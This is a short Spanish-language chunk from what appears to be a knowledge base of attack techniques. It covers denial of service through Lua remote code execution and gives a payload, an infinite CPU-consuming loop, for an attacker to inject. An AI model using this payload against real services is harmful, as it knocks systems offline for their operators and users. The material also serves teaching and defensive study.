---
chunk_id: technique::web::lua-rce::denial-of-service::001
domain: web
chunk_type: technique
---

### 4. Denegación de Servicio (DoS)

Si no puede robar datos, el atacante puede intentar tumbar el servicio consumiendo todos los recursos (CPU o Memoria).

**Payload:**

```lua
-- Bucle infinito que consume CPU
while true do 
    local x = math.sqrt(math.random()) 
end
```
